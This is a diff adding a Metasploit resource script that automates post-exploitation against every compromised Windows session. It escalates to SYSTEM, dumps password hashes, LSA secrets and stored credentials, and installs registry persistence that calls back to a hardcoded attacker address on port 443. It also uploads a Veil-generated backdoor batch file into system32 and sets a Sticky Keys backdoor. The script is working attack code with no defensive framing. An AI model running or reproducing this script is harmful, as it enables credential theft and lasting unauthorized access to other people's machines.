@@ -1,0 +1,71 @@
+#######################################################
+# Created by @jgaudard
+# Uses mubix's run_all_post.rc resource file to run multiple post exploitation modules against all sessions.
+# Does post exploitation things...
+# Created: 15 September 2014    Edited: 30 April 2016
+# Version  1.9
+#######################################################
+ 
+<ruby>
+ 
+lhost = "192.168.1.33"
+lport = "443"
+
+### Used for stickykeys persistence ###
+targetfile = "c:\\\\windows\\\\system32\\\\com\\\\comrepm.bat"
+backdoor = "/root/veil-output/source/backdoor4.bat"
+
+
+### These are the post exploitation scripts which will be ran.
+posts = ["post/windows/escalate/getsystem",
+"post/windows/manage/smart_migrate",
+"post/windows/gather/smart_hashdump",
+"post/windows/gather/lsa_secrets",
+"post/windows/gather/credentials/credential_collector",
+]
+ 
+ 
+### Sets global variables
+run_single("setg LHOST #{lhost}")
+run_single("setg LPORT #{lport}")
+
+### For each post module, run on each session ### 
+posts.each do|d|
+        print_status("Starting....oh, hello #{d}")
+        run_single("use #{d}")
+        run_single("resource /usr/share/metasploit-framework/scripts/resource/run_all_post.rc")
+end
+
+
+### For each session do these things... ###
+
+
+framework.sessions.each do |num,session|
+	print_status("Running registry persistence against session #{num}")
+	run_single("use exploit/windows/local/registry_persistence")
+	run_single("set STARTUP SYSTEM")
+	run_single("set LHOST #{lhost}")
+	run_single("set LPORT #{lport}")
+        run_single("set SESSION #{num}")
+        run_single("exploit -z")
+	
+	#print_status("Running persistence against session #{num}")
+        #run_single("use exploit/windows/local/persistence")
+        #run_single("set STARTUP SYSTEM")
+        #run_single("set LHOST #{lhost}")
+        #run_single("set LPORT #{lport}")
+        #run_single("set SESSION #{num}")
+        #run_single("exploit -z")
+
+	### Upload a file to use for Sticky Keys ###
+
+	session.fs.file.upload_file("#{targetfile}","#{backdoor}")
+
+	### Sticky Keys ###
+	run_single("use post/windows/manage/sticky_keys")
+	run_single("set EXE #{targetfile}")
+	run_single("set SESSION #{num}")
+	run_single("exploit -z")
+end
+
+</ruby>
